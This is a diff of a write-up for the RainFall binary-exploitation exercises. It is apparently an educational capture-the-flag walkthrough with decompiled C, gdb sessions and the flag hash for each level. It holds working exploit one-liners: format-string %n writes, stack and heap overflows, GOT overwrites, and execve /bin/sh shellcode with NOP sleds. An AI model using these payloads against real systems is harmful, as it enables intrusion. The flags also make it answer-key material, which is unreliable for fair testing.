@@ -1,19 +1,13 @@
----
-tags: []
-Links: []
-Created: 2023-12-04 15:34
----
 # level0
 
 Simplified decompiled binary:
 
 ```c
 int main(int argc,char *argv[])
-
 {
   int iVar1;
   char *local_20;
-  
+
   iVar1 = atoi(argv[1]);
   if (iVar1 == 423) {
     local_20 = strdup("/bin/sh");
@@ -108,7 +102,6 @@ void p(void)
   puts(local_50);
   strdup(local_50);
   return;
-  // shell code
 }
 
 void main(void)
@@ -159,8 +152,6 @@ Now that we did that, we need to make sure `eip` points to somewhere in our shel
 
 `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
 
-
-
 # level3
 
 ```c
@@ -184,27 +175,39 @@ void main(void)
 }
 ```
 
-Address of m: `0x0804988c`
-              `\x8c\x98\x04\x08`
+We can see here that `printf` is called, however the argument is not an absolute string, but instead a value that we can control. Therefore, we can use a little known feature of `printf`: the `%n`, that allows writing to the stack !
+
 [Exploit 101 - Format Strings - BreakInSecurity](https://axcheron.github.io/exploit-101-format-strings/)
 
+For that, we need to write `64` to the address of m. Meaning we have to get the address of m, write it to the buffer, determine where it is written in the memory, and finally write 64 - 4 characters with the `%n` to write this number to the memory, with `4$` used to specify what address to write to (spoiler: the address of m). 
+Address of m: `0x0804988c` -> `\x8c\x98\x04\x08`
+
+Let's try to determine at what position what we write in the memory is:
+
+```bash
 ./level3 
 AAAA %x %x %x %x %x %x %x %x %x %x 
 AAAA 200 b7fd1ac0 b7ff37d0 `41414141` 20782520 25207825 78252078 20782520 25207825 78252078 
-                            ^ AAAA
+```
 
+We get `AAAA` at the fourth argument (`41414141`).
+
+Let's now verify we can write an address here:
+
+```bash
 python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
 �200 b7fd1ac0 b7ff37d0 `804988c`
+```
 
+Finally, let's write the exploit by specifying to write the 64 bytes to the address of m:
+
+```bash
 (python -c 'print "\x8c\x98\x04\x08" + ("A" * 60) + "%4$n"' ; cat) | ./level3
+```
 
 `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
 
 # level4
-
-12 = offset %x %x %x....
-
-python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'| ./level4
 
 ```c
 void n(void)
@@ -227,14 +230,52 @@ void main(void)
 
 ```
 
+Here, the technique is the exact same, however there are a lot of characters to write to the terminal. It could be nice if a technique existed to allow us to write less to the terminal... Never mind, let's just write 16930116 characters in the terminal !
+
+12 = offset %x %x %x....
+
+```bash
+python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'| ./level4
+```
+
+
 `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
 
 # level5
-o = 080484a4 -> 134513828
-exit = *0x8049838
 
+```c
+void o(void)
+{
+  system("/bin/sh");
+  _exit(1);
+}
+
+void n(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+  exit(1);
+}
+
+void main(void)
+{
+  n();
+  return;
+}
+```
+
+Here the idea is the same as writing to a variable, however with a twist: we'll instead write to a pointer !
+Since a pointer is basically an int in disguise, we can change it's value with the printf exploit. Since we need to reach the function `o`, we can change the pointer of `exit` to make it point to `o`.
+
+o = `0x080484a4` -> `134513828`
+exit = `*0x8049838`
+
+```bash
 python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' | ./level5
                                         ^^^^^^^^^ o - 4
+```
 `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
 
 # level6
@@ -266,7 +307,11 @@ void main(int argc, char **argv)
 }
 ```
 
+We can use exactly the same exploit as in the second exercise, we just need to change the offsets and the `EIP` value. 
+
+```bash
 ./level6 $(python /tmp/exploit.py)
+```
 
 `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
 
@@ -312,21 +357,10 @@ int main(int argc, char **argv)
   return 0;
 }
 ```
-level7@RainFall:~$ ltrace ./level7 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
-__libc_start_main(0x8048521, 2, 0xbffff664, 0x8048610, 0x8048680 <unfinished ...>
-malloc(8)                                                   = 0x0804a008
-malloc(8)                                                   = 0x0804a018
-malloc(8)                                                   = 0x0804a028
-malloc(8)                                                   = 0x0804a038
-strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)   = 0x0804a018
-strcpy(0x37614136, NULL <unfinished ...>
---- SIGSEGV (Segmentation fault) ---
-+++ killed by SIGSEGV +++
 
-0x37614136 -> offset = 20
+Just like in level5, we need to override the pointer of `puts` in order to access the `m` function, which is the one that prints the flag (`c`).
 
-argv 1 -> offset + addr of puts
-argv 2 -> addr of m()
+In order to do that, we can overflow the first argument into the second, which will help us replace the address of `c` (first address after the padding) by the address of `m` (second argument)
 
 ```bash
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 
@@ -334,156 +368,336 @@ argv 2 -> addr of m()
 flag: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
 
 # level8
+```c
+int main(void)
+{
+	char cVar1;
+	char *pcVar2;
+	int iVar3;
+	uint uVar4;
+	char *pbVar5;
+	char *pbVar6;
+	bool bVar7;
+	int check_service_dup;
+	int uVar9;
+	bool bVar10;
+	int uVar11;
+	char bVar12;
+	char local_90[5];
+	char local_8b[2];
+	char service_dup[125];
 
-Il faut :
+	bVar12 = 0;
+	do
+	{
+		printf("%p, %p \n", auth, service);
+		pcVar2 = fgets((char *)local_90, 0x80, stdin);
+		bVar7 = false;
+		bVar10 = pcVar2 == (char *)0x0;
+		if (bVar10)
+		{
+			return 0;
+		}
+		iVar3 = 5;
+		pbVar5 = local_90;
+		pbVar6 = (char *)"auth ";
+		do
+		{
+			if (iVar3 == 0)
+				break;
+			iVar3 = iVar3 + -1;
+			bVar7 = *pbVar5 < *pbVar6;
+			bVar10 = *pbVar5 == *pbVar6;
+			pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+			pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+		} while (bVar10);
+		check_service_dup = 0;
+		uVar11 = (!bVar7 && !bVar10) == bVar7;
+		if ((bool)uVar11)
+		{
+			auth = (int *)malloc(4);
+			*auth = 0;
+			uVar4 = 0xffffffff;
+			pcVar2 = local_8b;
+			do
+			{
+				if (uVar4 == 0)
+					break;
+				uVar4 = uVar4 - 1;
+				cVar1 = *pcVar2;
+				pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
+			} while (cVar1 != '\0');
+			uVar4 = ~uVar4 - 1;
+			check_service_dup = uVar4 < 0x1e;
+			uVar11 = uVar4 == 0x1e;
+			if (uVar4 < 0x1f)
+			{
+				strcpy((char *)auth, local_8b);
+			}
+		}
+		iVar3 = 5;
+		pbVar5 = local_90;
+		pbVar6 = (char *)"reset";
+		do
+		{
+			printf("reset while\n");
+			if (iVar3 == 0)
+				break;
+			iVar3 = iVar3 + -1;
+			check_service_dup = *pbVar5 < *pbVar6;
+			uVar11 = *pbVar5 == *pbVar6;
+			pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+			pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+		} while ((bool)uVar11);
+		uVar9 = 0;
+		check_service_dup = (!(bool)check_service_dup && !(bool)uVar11) == (bool)check_service_dup;
+		if ((bool)check_service_dup)
+		{
+			free(auth);
+		}
+		iVar3 = 6;
+		pbVar5 = local_90;
+		pbVar6 = (char *)"service";
+		do
+		{
+			printf("service while\n");
+			if (iVar3 == 0)
+				break;
+			iVar3 = iVar3 + -1;
+			uVar9 = *pbVar5 < *pbVar6;
+			check_service_dup = *pbVar5 == *pbVar6;
+			pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+			pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+		} while ((bool)check_service_dup);
+		uVar11 = 0;
+		check_service_dup = (!(bool)uVar9 && !(bool)check_service_dup) == (bool)uVar9;
+		if ((bool)check_service_dup)
+		{
+			uVar11 = (char *)0xfffffff8 < local_90;
+			check_service_dup = service_dup == (char *)0x0;
+			service = strdup(service_dup);
+		}
+		iVar3 = 5;
+		pbVar5 = local_90;
+		pbVar6 = (char *)"login";
+		do
+		{
+			printf("login while\n");
+			if (iVar3 == 0)
+				break;
+			iVar3 = iVar3 + -1;
+			uVar11 = *pbVar5 < *pbVar6;
+			check_service_dup = *pbVar5 == *pbVar6;
+			pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+			pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+		} while ((bool)check_service_dup);
+		if ((!(bool)uVar11 && !(bool)check_service_dup) == (bool)uVar11)
+		{
+			if (auth[8] == 0)
+			{
+				fwrite("Password:\n", 1, 10, stdout);
+			}
+			else
+			{
+				system("/bin/sh");
+			}
+		}
+	} while (true);
+}
+```
 
-`auth    `
+To access the `/bin/sh`, we just have to make sure the last character of `auth` is not empty when we run login.
 
-`service`
+To do so, we run `auth` to initialize the variable, then service twice to fill auth, and finally login to execute `/bin/sh`
 
-`service`
+We have to do:
 
-`login`
+```
+auth 
+service
+service
+login
+```
 
+Don't forget the space after the first `auth`
 
-car  if (auth[8] == 0) donc last char de auth != 0
+The first address needs to 32 more the second one.
+Each time we write service, the second address gets incremented by 16.
 
-et faut pas que avant de faire login l'adresse de l'input + 32 -> (32 = 2 * 16) == output
-
-service + 0x10 = 16
-
+```
 gdb> disass main
-
-   0x08048625 <+193>:	cmp    eax,0x1e donc 31, donc il faut 2 service pour >= 32
+0x08048625 <+193>: cmp eax,0x1e
+```
+So the second address is 31, then we need to run service twice to be >= 32
 
 `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
 
 # level9
-## GDB
+  
+```
+run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
 
-> run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
 Program received signal SIGSEGV, Segmentation fault.
+
 0x08048682 in main ()
+```
 
-
+  
+```
 > info register eax
-eax            0x41366441	1094083649 -> 108 offset
+> eax 0x41366441 1094083649 -> 108 offset
+```
+  
 
+```
 > disass main
 [...]
-   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
-   0x0804867c <+136>:	mov    0x10(%esp),%eax
+0x08048677 <+131>: call 0x804870e <_ZN1N13setAnnotationEPc>
+0x0804867c <+136>: mov 0x10(%esp),%eax
 [...]
 
->  b *main+136 # Just after setAnnotation
+> b *main+136 # Just after setAnnotation
 > run 'AAAA'
 > x $eax
-0x0804a00c:	0x41414141
+0x0804a00c: 0x41414141
 addr_shell (4) + shellcode (23) + padding (81) + buffer_addr (4)
-112 
+112
+```
+  
 
+```
 addresse_shell_code = memcpy + 0x04
+
 > ltrace ./level9 "AAAA"
-memcpy(0x0804a00c, "AAAA", 4)                            = 0x0804a00c
+memcpy(0x0804a00c, "AAAA", 4) = 0x0804a00c
+
 > gdb
 > disas 0x804870e
-0x08048738 <+42>:	leave  
+0x08048738 <+42>: leave
 > b *0x08048738
 > run AAAA
-0x804a00c:	0x41414141	0x00000000	0x00000000	0x00000000
-            ^^^^^^^^^^
+0x804a00c: 0x41414141 0x00000000 0x00000000 0x00000000
+^^^^^^^^^^
 
 addresse_shell_code = 0x804a00c +0x04 = 0x804A010
+```
 
-
-
-
+```bash
 ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A" * 59 + "\x0c\xa0\x04\x08"')
+```
 
-# https://wiremask.eu/tools/buffer-overflow-pattern-generator/
-# http://shell-storm.org/shellcode/files/shellcode-827.html -> \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+[Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)  
 
 `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
-_ZN1N13setAnnotationEPc -> N::setAnnotation
-
 # bonus0
-## gdb
 
-> r
+
+```
+r
 -
 OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
 -
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+```
 
-0x41336141 -> offset 9 
+`0x41336141 -> offset 9`
 
-> export shellcode=$(python -c 'print "\x90"*153 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
-> gdb ./bonus0
-> break main
-> run
-> x/600wx $esp
-0xbffff808:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff818:	0x90909090	0x90909090	0x90909090	0x90909090 # This one
-0xbffff828:	0x90909090	0x90909090	0x90909090	0x90909090
+```
+export shellcode=$(python -c 'print "\x90"*153 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+```
 
-0xbffffeb8
+```
+gdb ./bonus0
+break main
+run
+x/600wx $esp
+0xbffff808: 0x90909090 0x90909090 0x90909090 0x90909090
+0xbffff818: 0x90909090 0x90909090 0x90909090 0x90909090 # This one
+0xbffff828: 0x90909090 0x90909090 0x90909090 0x90909090
+```
 
-(python -c 'print("A" * 20)'; python -c 'import struct;print("B" * 9  + struct.pack("I", 0xbffffeb8) + "B"*7)'; cat) | ./bonus0
+`0xbffffeb8`
 
+```bash
+(python -c 'print("A" * 20)'; python -c 'import struct;print("B" * 9 + struct.pack("I", 0xbffffeb8) + "B"*7)'; cat) | ./bonus0
+```
+  
 `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
 
 # bonus1
 
 The goal is to have a value than match with 44 bytes
 
+```
 * 4 == << 2
 So
-44 = 00101100
->> 2 == 00001011 == 11
-
+44 = 00101100b
+>> 2 == 00001011b == 11
+```
+```
 11d = 00000000 00000000 00000000 00001011b
 10000000 00000000 00000000 00001011 = -2147483637
 ^
 For the `-`
+```
+```
 And if we << 2
-
 00000000 00000000 00000000 00101100 = 44
-# https://www.binaryconvert.com/result_signed_int.html?hexadecimal=0000002C (remove space)
+```
 
-FLOW == 1464814662 reverse indian "WOLF"
+[Signed integer (32-bit) Converter](https://www.binaryconvert.com/result_signed_int.html?hexadecimal=0000002C) (remove space)
+
+```
+FLOW <- reverse endian "WOLF" == 1464814662 
+
 FLOW * 11 == 40 + 4
-./bonus1 -2147483637  $(python -c 'print("FLOW" * 11)')
+```
+
+```bash
+./bonus1 -2147483637 $(python -c 'print("FLOW" * 11)')
+```
 
 `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
 
 # bonus2
 
-## gdb
-> run $(python -c "print 'A' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+```bash
+run $(python -c "print 'A' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+```
+  
+`0x38614137 -> offset == 23`
 
-0x38614137 -> offset == 23
-
+```
 nl -> DAT_08048740
 fi -> DAT_0804873d
-
+```
+  
+```bash
 export LANG=$(python -c 'print "nl" + "\x90"*153 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+
 > gdb ./bonus2
 > break main
 > run
 > x/600wx $esp
-0xbffff808:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff818:	0x90909090	0x90909090	0x90909090	0x90909090 # This one
-0xbffff828:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff808: 0x90909090 0x90909090 0x90909090 0x90909090
+0xbffff818: 0x90909090 0x90909090 0x90909090 0x90909090 # This one
+0xbffff828: 0x90909090 0x90909090 0x90909090 0x90909090
 
 0xbffffe9c
-./bonus2 $(python -c "print 'A' * 40") $(python -c "import struct; print('B' * 23 + struct.pack('I',0xbffffe9c))")
+```
 
-`71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
+```bash
+./bonus2 $(python -c "print 'A' * 40") $(python -c "import struct; print('B' * 23 + struct.pack('I',0xbffffe9c))")
+```
+
+  `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
 
 # bonus3
 
 strcmp of "" == 0 everytime...
 
+```bash
 ./bonus3 ""
+```
 
 `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
